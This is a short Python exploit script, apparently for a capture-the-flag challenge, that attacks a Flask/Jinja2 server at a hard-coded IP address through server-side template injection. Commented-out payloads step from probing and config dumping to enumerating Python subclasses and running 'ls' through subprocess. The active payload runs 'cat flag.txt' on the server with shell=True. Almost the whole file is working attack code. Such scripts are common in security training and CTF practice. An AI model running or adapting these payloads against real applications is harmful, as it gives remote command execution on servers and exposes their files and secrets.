#!/usr/bin/env python3
import requests
import html

# https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee

url='http://138.68.182.108:31783'

def inject(inj):
    response = requests.get(url+inj).text
    print(html.unescape(response))

# inj='/{{7*7}}'
# inj='/{{config.items()}}'
# inj="/{{config.from_object('os')}}"
# inj="/{{ ''.__class__.__mro__[1].__subclasses__() }}"
# inj="/{{ ''.__class__.__mro__[1].__subclasses__()[:415] }}"
# inj="/{{ ''.__class__.__mro__[1].__subclasses__()[414] }}"
# inj="/{{ ''.__class__.__mro__[1].__subclasses__()[414]('ls',shell=True,stdout=-1).communicate() }}"
inj="/{{ ''.__class__.__mro__[1].__subclasses__()[414]('cat flag.txt',shell=True,stdout=-1).communicate() }}"

inject(inj)